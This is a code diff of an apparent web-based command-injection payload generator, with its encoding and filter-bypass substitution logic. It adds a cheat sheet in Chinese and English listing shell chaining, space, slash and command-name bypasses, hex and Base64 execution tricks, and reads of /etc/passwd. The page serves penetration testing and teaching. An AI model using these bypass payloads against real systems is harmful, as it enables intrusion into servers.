-                    pre.addEventListener('mouseleave', function () {
+                    codeWrapper.addEventListener('mouseleave', function () {
                         copyBtn.style.opacity = '0';
+                    });
+
+                    codeWrapper.appendChild(copyBtn);
+                    codeWrapper.appendChild(pre);
+                    hintSection.appendChild(codeWrapper);
+
+                    commandsDisplay.appendChild(hintSection);
+                    commandIndex++;
+                });
+            }
+
+            function func_oninput() {
+                try {
+                    var cmd_origin = document.getElementById("data0").value.replace("arr0w1_cmd_origin", document.getElementById("your_cmd").value);
+
+                    var cmd_origin_btoa_ed = func_wise_btoa(cmd_origin);
+                    var cmd_origin_ps_base64 = powershellBase64(cmd_origin); // PowerShell UTF-16LE Base64
+                    var cmd_origin_hex = ascii_2_Hex(cmd_origin);
+
+                    // Java字符串转义: 双引号和反斜杠需要转义
+                    var cmd_origin_java_escaped = cmd_origin
+                        .replace(/\\/g, '\\\\')  // 先转义反斜杠
+                        .replace(/"/g, '\\"');   // 再转义双引号
+
+                    // Payload 0 - Original command
+                    const payload0El = document.getElementById("payload0");
+                    if (payload0El) {
+                        payload0El.textContent = cmd_origin;
+                    }
+
+                    // Process each payload with all replacements
+                    // 1. Java Runtime.exec() - String[] (需要转义双引号)
+                    const payload1Data = data1
+                        .replace(/arr0w1_cmd_origin/g, cmd_origin_java_escaped)
+                        .replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
+                    displayPayloadWithCommands('payload1', payload1Data);
+
+                    // 2. Java Runtime.exec() - String (Base64)
+                    const payload2Data = data2
+                        .replace(/arr0w1_cmd_origin/g, cmd_origin)
+                        .replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
+                    displayPayloadWithCommands('payload2', payload2Data);
+
+                    // 3. Shell Encoding (Base64/Hex)
+                    const cmd_origin_hex_full = ascii_2_Hex_full(cmd_origin);
+                    const payload3Data = data3
+                        .replace(/arr0w1_hex_full/g, cmd_origin_hex_full)
+                        .replace(/arr0w1_cmd_ascii2hex/g, cmd_origin_hex)
+                        .replace(/arr0w1_cmd_origin/g, cmd_origin)
+                        .replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
+                    displayPayloadWithCommands('payload3', payload3Data);
+
+                    // 4. Node.js child_process (需要转义单引号)
+                    var cmd_origin_js_escaped = cmd_origin
+                        .replace(/\\/g, '\\\\')  // 先转义反斜杠
+                        .replace(/'/g, "\\'");   // 再转义单引号
+                    const payload4Data = data4
+                        .replace(/arr0w1_cmd_ascii2hex/g, cmd_origin_hex)
+                        .replace(/arr0w1_cmd_origin/g, cmd_origin_js_escaped)
+                        .replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
+                    displayPayloadWithCommands('payload4', payload4Data);
+
+                    // 5. PowerShell / cmd.exe (PowerShell双引号需要转义)
+                    var cmd_origin_ps_escaped = cmd_origin
+                        .replace(/"/g, '`"');   // PowerShell用反引号转义双引号
+                    const payload5Data = data5
+                        .replace(/arr0w1_base64_utf16/g, cmd_origin_ps_base64)
+                        .replace(/arr0w1_cmd_origin/g, cmd_origin_ps_escaped)
+                        .replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
+                    displayPayloadWithCommands('payload5', payload5Data);
+
+                    // 6. Filter Bypass Techniques - Based on PayloadsAllTheThings
+                    let payload6Data = data6
+                        // Single Quote bypasses
+                        .replace(/arr0w1_sq_empty/g, bypassSingleQuoteEmpty(cmd_origin))
+                        .replace(/arr0w1_sq_wrap_start/g, bypassSingleQuoteWrapStart(cmd_origin))
+                        .replace(/arr0w1_sq_wrap_mid/g, bypassSingleQuoteWrapMid(cmd_origin))
+                        // Double Quote bypasses
+                        .replace(/arr0w1_dq_empty/g, bypassDoubleQuoteEmpty(cmd_origin))
+                        .replace(/arr0w1_dq_wrap_start/g, bypassDoubleQuoteWrapStart(cmd_origin))
+                        .replace(/arr0w1_dq_wrap_mid/g, bypassDoubleQuoteWrapMid(cmd_origin))
+                        // Backslash bypasses
+                        .replace(/arr0w1_bs_single/g, bypassBackslashSingle(cmd_origin))
+                        .replace(/arr0w1_bs_all/g, bypassBackslashAll(cmd_origin))
+                        // Backtick bypass
+                        .replace(/arr0w1_backtick_empty/g, bypassBacktickEmpty(cmd_origin))
+                        // $@, $(), ${x} bypasses
+                        .replace(/arr0w1_dollar_at/g, bypassDollarAt(cmd_origin))
+                        .replace(/arr0w1_dollar_paren/g, bypassDollarParen(cmd_origin))
+                        .replace(/arr0w1_dollar_var/g, bypassDollarVar(cmd_origin))
+                        // Space bypasses
+                        .replace(/arr0w1_cmd_ifs_short/g, bypassIFSShort(cmd_origin))
+                        .replace(/arr0w1_cmd_ifs/g, bypassIFS(cmd_origin))
+                        .replace(/arr0w1_brace_expansion/g, bypassBraceExpansion(cmd_origin))
+                        .replace(/arr0w1_cmd_tab/g, bypassTab(cmd_origin))
+                        .replace(/arr0w1_input_redirect/g, bypassInputRedirect(cmd_origin))
+                        // Hex encoding
+                        .replace(/arr0w1_hex_echo/g, bypassHexEcho(cmd_origin))
+                        .replace(/arr0w1_hex_eval/g, bypassHexEval(cmd_origin))
+                        .replace(/arr0w1_hex_ansi/g, bypassHexAnsi(cmd_origin))
+                        // Slash bypasses (${HOME:0:1}, ${PWD:0:1})
+                        .replace(/arr0w1_home_slash/g, bypassHomeSlash(cmd_origin))
+                        .replace(/arr0w1_pwd_slash/g, bypassPwdSlash(cmd_origin))
+                        // Wildcard bypasses
+                        .replace(/arr0w1_wildcard_question/g, bypassWildcardQuestion(cmd_origin))
+                        .replace(/arr0w1_wildcard_asterisk/g, bypassWildcardAsterisk(cmd_origin))
+                        // Other bypasses
+                        .replace(/arr0w1_cmd_backslash_newline/g, bypassBackslashNewline(cmd_origin))
+                        .replace(/arr0w1_cmd_random_case/g, bypassRandomCase(cmd_origin))
+                        // Generic replacements
+                        .replace(/arr0w1_cmd_origin/g, cmd_origin)
+                        .replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
+                    displayPayloadWithCommands('payload6', payload6Data);
+
+                    // Update container visibility based on environment
+                    updateContainerVisibility();
+
+                } catch (err) {
+                    console.error('Error in func_oninput:', err);
+                }
+            }
+
+            // Update container visibility based on selected environments
+            function updateContainerVisibility() {
+                // Show all containers, then hide empty ones
+                const containers = ['payload1-container', 'payload2-container', 'payload3-container',
+                    'payload4-container', 'payload5-container', 'payload6-container'];
+
+                containers.forEach(containerId => {
+                    const container = document.getElementById(containerId);
+                    if (container) {
+                        // Check if container has any visible commands after filtering
+                        const commandsDisplay = container.querySelector('[id$="-commands-display"]');
+                        if (commandsDisplay && commandsDisplay.children.length === 0) {
+                            container.style.display = 'none';
+                        } else {
+                            container.style.display = 'block';
+                        }
+                    }
+                });
+            }
+
+            // -----
+
+            // Add hover effect for payload0 (hardcoded in HTML)
+            (function () {
+                const payload0HintCode = document.querySelector('#payload0-container .hint-code');
+                const payload0CopyBtn = document.querySelector('#payload0-container .copy-btn');
+                if (payload0HintCode && payload0CopyBtn) {
+                    payload0HintCode.addEventListener('mouseenter', function () {
+                        payload0CopyBtn.style.opacity = '1';
+                    });
+                    payload0HintCode.addEventListener('mouseleave', function () {
+                        payload0CopyBtn.style.opacity = '0';
                     });
                     // Also show when hovering over the button itself
-                    copyBtn.addEventListener('mouseenter', function () {
-                        copyBtn.style.opacity = '1';
+                    payload0CopyBtn.addEventListener('mouseenter', function () {
+                        payload0CopyBtn.style.opacity = '1';
                     });
-                    copyBtn.addEventListener('mouseleave', function () {
-                        copyBtn.style.opacity = '0';
+                    payload0CopyBtn.addEventListener('mouseleave', function () {
+                        payload0CopyBtn.style.opacity = '0';
                     });
-
-                    cmdWrapper.appendChild(copyBtn);
-                    cmdWrapper.appendChild(pre);
-
-                    hintSection.appendChild(strong);
-                    hintSection.appendChild(cmdWrapper);
-                    codeWrapper.appendChild(hintSection);
-                });
-            } else if (commandLines.length === 1) {
-                // Single command - display as one code block
-                const copyBtn = document.createElement('button');
-                copyBtn.className = 'copy-btn';
-                copyBtn.textContent = 'Copy';
-                copyBtn.onclick = function(e) {
-                    e.stopPropagation();
-                    navigator.clipboard.writeText(commandLines[0].command).then(() => {
-                        const originalText = copyBtn.textContent;
-                        copyBtn.textContent = 'Copied!';
-                        setTimeout(() => {
-                            copyBtn.textContent = originalText;
-                        }, 1500);
-                    }).catch(err => {
-                        console.error('Failed to copy:', err);
-                    });
-                };
-
-                const pre = document.createElement('pre');
-                pre.className = 'hint-code';
-                const code = document.createElement('code');
-                code.id = payloadId;
-                code.textContent = commandLines[0].command;
-                pre.appendChild(code);
-
-                // Add hover effect to show copy button when hovering over hint-code
-                pre.addEventListener('mouseenter', function () {
-                    copyBtn.style.opacity = '1';
-                });
-                pre.addEventListener('mouseleave', function () {
-                    copyBtn.style.opacity = '0';
-                });
-                // Also show when hovering over the button itself
-                copyBtn.addEventListener('mouseenter', function () {
-                    copyBtn.style.opacity = '1';
-                });
-                copyBtn.addEventListener('mouseleave', function () {
-                    copyBtn.style.opacity = '0';
-                });
-
-                codeWrapper.appendChild(copyBtn);
-                codeWrapper.appendChild(pre);
-            } else {
-                // No commands found, display full content
-                const copyBtn = document.createElement('button');
-                copyBtn.className = 'copy-btn';
-                copyBtn.textContent = 'Copy';
-                copyBtn.onclick = function(e) {
-                    e.stopPropagation();
-                    const codeEl = document.getElementById(payloadId);
-                    if (codeEl) {
-                        copyPayload(payloadId, copyBtn);
-                    } else {
-                        navigator.clipboard.writeText(payloadData).then(() => {
-                            const originalText = copyBtn.textContent;
-                            copyBtn.textContent = 'Copied!';
-                            setTimeout(() => {
-                                copyBtn.textContent = originalText;
-                            }, 1500);
-                        });
-                    }
-                };
-
-                const pre = document.createElement('pre');
-                pre.className = 'hint-code';
-                const code = document.createElement('code');
-                code.id = payloadId;
-                code.textContent = payloadData;
-                pre.appendChild(code);
-
-                // Add hover effect to show copy button when hovering over hint-code
-                pre.addEventListener('mouseenter', function () {
-                    copyBtn.style.opacity = '1';
-                });
-                pre.addEventListener('mouseleave', function () {
-                    copyBtn.style.opacity = '0';
-                });
-                // Also show when hovering over the button itself
-                copyBtn.addEventListener('mouseenter', function () {
-                    copyBtn.style.opacity = '1';
-                });
-                copyBtn.addEventListener('mouseleave', function () {
-                    copyBtn.style.opacity = '0';
-                });
-
-                codeWrapper.appendChild(copyBtn);
-                codeWrapper.appendChild(pre);
-            }
-
-            container.appendChild(codeWrapper);
-        }
-
-        var func_oninput = function () {
-            try {
-            var cmd_origin = document.getElementById("data0").value.replace("arr0w1_cmd_origin", document.getElementById("your_cmd").value);
-
-            var cmd_origin_btoa_ed = func_wise_btoa(cmd_origin);
-
-                // Payload 0 - Original command
-                const payload0El = document.getElementById("payload0");
-                if (payload0El) {
-                    payload0El.textContent = cmd_origin;
                 }
+            })();
 
-                // Process each payload
-                const payload1Data = data1.replace(/arr0w1_cmd_origin/g, cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
-                displayPayloadWithCommands('payload1', payload1Data);
+            func_oninput();
+        </script>
 
-                const payload2Data = data2.replace(/arr0w1_cmd_origin/g, cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
-                displayPayloadWithCommands('payload2', payload2Data);
+        <!-- Smart Hint System -->
+        <div id="interactive-hint" class="interactive-hint">
+            <div class="hint-content" style="max-width: 800px; text-align: left;">
+                <h2 style="text-align: center;">💡 Command Injection Cheat Sheet</h2>
 
-                const payload3Data = data3.replace(/ascii_2_Hex_without_black_chars_flag/g, ascii_2_Hex_without_black_chars(cmd_origin))
-                    .replace(/arr0w1_cmd_ascii2hex/g, ascii_2_Hex(cmd_origin))
-                    .replace(/arr0w1_cmd_origin/g, cmd_origin)
-                    .replace(/arr0w1_base64/g, cmd_origin_btoa_ed)
-                    .replace(/arr0w1_cmd_origin/g, cmd_origin.replace(/\'/g, "\\'"));
-                displayPayloadWithCommands('payload3', payload3Data);
+                <h3
+                    style="color: var(--primary-color); margin-top: 20px; border-bottom: 1px solid var(--primary-color); padding-bottom: 5px;">
+                    命令链接符 (Chaining Commands)</h3>
+                <ul style="font-family: var(--font-mono); font-size: 0.85rem;">
+                    <li><code>;</code> 分号 - 顺序执行多个命令</li>
+                    <li><code>&&</code> AND - 仅当前一命令成功时执行</li>
+                    <li><code>||</code> OR - 仅当前一命令失败时执行</li>
+                    <li><code>&</code> 后台执行 - 命令在后台运行</li>
+                    <li><code>|</code> 管道 - 前一命令输出作为后一命令输入</li>
+                </ul>
 
-                const payload4Data = data4.replace(/arr0w1_cmd_ascii2hex/g, ascii_2_Hex(cmd_origin))
-                    .replace(/arr0w1_cmd_origin/g, cmd_origin)
-                    .replace(/arr0w1_base64/g, cmd_origin_btoa_ed)
-                    .replace(/arr0w1_cmd_origin/g, cmd_origin.replace(/\'/g, "\\'"));
-                displayPayloadWithCommands('payload4', payload4Data);
+                <h3
+                    style="color: var(--primary-color); margin-top: 20px; border-bottom: 1px solid var(--primary-color); padding-bottom: 5px;">
+                    空格绕过 (Bypass Without Space)</h3>
+                <ul style="font-family: var(--font-mono); font-size: 0.85rem;">
+                    <li><code>${IFS}</code> - Internal Field Separator (Bash only, 不能用在引号内!)</li>
+                    <li><code>{cat,/etc/passwd}</code> - 花括号展开 (Bash only)</li>
+                    <li><code>cat&lt;/etc/passwd</code> - 输入重定向</li>
+                    <li><code>%09</code> - Tab字符 (URL编码, Web场景)</li>
+                    <li><code>$'cmd\x20arg'</code> - ANSI-C Quoting</li>
+                </ul>
 
-                const payload5Data = data5.replace(/arr0w1_cmd_origin/g, cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
-                if (payload5Data.trim()) {
-                    displayPayloadWithCommands('payload5', payload5Data);
-                }
+                <h3
+                    style="color: var(--primary-color); margin-top: 20px; border-bottom: 1px solid var(--primary-color); padding-bottom: 5px;">
+                    斜杠绕过 (Bypass Slash Filter)</h3>
+                <ul style="font-family: var(--font-mono); font-size: 0.85rem;">
+                    <li><code>${HOME:0:1}</code> - 提取HOME路径第一个字符 /</li>
+                    <li><code>${PWD:0:1}</code> - 提取PWD路径第一个字符 /</li>
+                    <li><code>echo . | tr '!-0' '"-1'</code> - 用tr命令生成 /</li>
+                </ul>
 
-                const payload6Data = data6.replace(/arr0w1_cmd_origin/g, cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
-                if (payload6Data.trim()) {
-                    displayPayloadWithCommands('payload6', payload6Data);
-                }
-            } catch (err) {
-                console.error('Error in func_oninput:', err);
-            }
-        }
+                <h3
+                    style="color: var(--primary-color); margin-top: 20px; border-bottom: 1px solid var(--primary-color); padding-bottom: 5px;">
+                    命令名绕过 (Bypass Command Filter)</h3>
+                <ul style="font-family: var(--font-mono); font-size: 0.85rem;">
+                    <li><code>wh''oami</code> / <code>wh""oami</code> - 空引号插入</li>
+                    <li><code>w\hoami</code> - 反斜杠插入</li>
+                    <li><code>wh``oami</code> - 空反引号插入</li>
+                    <li><code>who$@ami</code> / <code>who$()ami</code> - 变量/子shell插入</li>
+                    <li><code>/???/i?</code> - 通配符 ? (必须有路径前缀!)</li>
+                    <li><code>/b*/i*</code> - 通配符 * (必须有路径前缀!)</li>
+                    <li>⚠️ <code>i*</code> 单独使用会匹配当前目录文件，报错!</li>
+                </ul>
 
-        // -----
+                <h3
+                    style="color: var(--primary-color); margin-top: 20px; border-bottom: 1px solid var(--primary-color); padding-bottom: 5px;">
+                    编码绕过 (Encoding Bypass)</h3>
+                <ul style="font-family: var(--font-mono); font-size: 0.85rem;">
+                    <li><code>echo -e "\x69\x64"|bash</code> - Hex + 管道执行 ✅ 支持 && || ;</li>
+                    <li><code>eval $(echo -e "\x69\x64")</code> - Hex + eval执行 ✅ 支持 && || ;</li>
+                    <li><code>$'\x69\x64'</code> - ANSI-C Hex ⚠️ 仅限简单命令!</li>
+                    <li><code>eval $'\x69\x64...'</code> - ANSI-C + eval ✅ 支持 && || ;</li>
+                    <li><code>`echo -e "\x69\x64"`</code> - ⚠️ 会执行但报错 (输出被当命令)</li>
+                    <li><code>echo aWQ=|base64 -d|bash</code> - Base64编码 ✅</li>
+                </ul>
 
-        // Add hover effect for payload0 (hardcoded in HTML)
-        (function() {
-            const payload0HintCode = document.querySelector('#payload0-container .hint-code');
-            const payload0CopyBtn = document.querySelector('#payload0-container .copy-btn');
-            if (payload0HintCode && payload0CopyBtn) {
-                payload0HintCode.addEventListener('mouseenter', function () {
-                    payload0CopyBtn.style.opacity = '1';
-                });
-                payload0HintCode.addEventListener('mouseleave', function () {
-                    payload0CopyBtn.style.opacity = '0';
-                });
-                // Also show when hovering over the button itself
-                payload0CopyBtn.addEventListener('mouseenter', function () {
-                    payload0CopyBtn.style.opacity = '1';
-                });
-                payload0CopyBtn.addEventListener('mouseleave', function () {
-                    payload0CopyBtn.style.opacity = '0';
-                });
-            }
-        })();
+                <h3
+                    style="color: var(--primary-color); margin-top: 20px; border-bottom: 1px solid var(--primary-color); padding-bottom: 5px;">
+                    命令替换注入 (Inside A Command)</h3>
+                <ul style="font-family: var(--font-mono); font-size: 0.85rem;">
+                    <li><code>`cmd`</code> - 反引号命令替换</li>
+                    <li><code>$(cmd)</code> - $() 命令替换</li>
+                </ul>
 
-        func_oninput();
-    </script>
+                <h3
+                    style="color: var(--primary-color); margin-top: 20px; border-bottom: 1px solid var(--primary-color); padding-bottom: 5px;">
+                    ⚠️ 重要限制</h3>
+                <ul style="font-size: 0.85rem; color: #ff6b6b;">
+                    <li><strong>反引号陷阱</strong> - <code>`id`</code> 会执行 id，但输出 <code>uid=503...</code> 会被当作命令执行，报错
+                        "command
+                        not found"！<br>
+                        <span style="color: #aaa; font-size: 0.8rem;">→ 命令会执行，但随后报错。用于盲注/带外可行，直接回显不行</span>
+                    </li>
+                    <li><strong>Shell 关键字不能绕过</strong> - <code>while</code>, <code>do</code>, <code>done</code>,
+                        <code>if</code>, <code>then</code>, <code>fi</code>, <code>for</code> 等是 shell
+                        语法的一部分，不能用引号/反斜杠绕过!
+                    </li>
+                    <li><strong>${IFS}</strong> 不能用在单引号内 (如 awk '{print $5}' 中的空格无法替换)</li>
+                    <li><strong>Brace Expansion</strong> {cmd,arg} 仅在 Bash 有效，Zsh 不支持</li>
+                    <li><strong>Random Case</strong> wHoAmI 仅在 Windows 有效</li>
+                </ul>
 
-    <!-- Smart Hint System -->
-    <div id="interactive-hint" class="interactive-hint">
-        <div class="hint-content">
-            <h2>💡 命令执行工具使用说明</h2>
-            <p>输入命令后会自动生成多种格式的payload，包括：</p>
-            <ul>
-                <li>Java Runtime.exec() - String[] 参数类型</li>
-                <li>Java Runtime.exec() - String 参数类型</li>
-                <li>Shell 编码方式（base64、hex等）</li>
-                <li>Node.js child_process.exec()</li>
-                <li>多种编码绕过技术</li>
-            </ul>
-            <button class="hint-close" onclick="toggleHint()">关闭</button>
+                <p style="margin-top: 20px; font-size: 0.85rem; color: var(--text-secondary); text-align: center;">
+                    参考: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection"
+                        target="_blank" style="color: var(--primary-color);">PayloadsAllTheThings - Command
+                        Injection</a>
+                </p>
+                <button class="hint-close" onclick="toggleHint()" style="margin-top: 15px;">关闭</button>
+            </div>
         </div>
-    </div>
 
-    <script>
-        function toggleHint() {
-            const hint = document.getElementById('interactive-hint');
-            hint.classList.toggle('show');
-        }
-    </script>
+        <script>
+            function toggleHint(event) {
+                if (event) event.stopPropagation();
+                const hint = document.getElementById('interactive-hint');
+                hint.classList.toggle('show');
+
+                // Add click listener to close on outside click
+                if (hint.classList.contains('show')) {
+                    setTimeout(() => {
+                        document.addEventListener('click', closeHintOnOutsideClick);
+                    }, 0);
+                } else {
+                    document.removeEventListener('click', closeHintOnOutsideClick);
+                }
+            }
+
+            function closeHintOnOutsideClick(event) {
+                const hint = document.getElementById('interactive-hint');
+                const hintContent = hint.querySelector('.hint-content');
+
+                if (hintContent && !hintContent.contains(event.target)) {
+                    hint.classList.remove('show');
+                    document.removeEventListener('click', closeHintOnOutsideClick);
+                }
+            }
+        </script>
 
 </html>
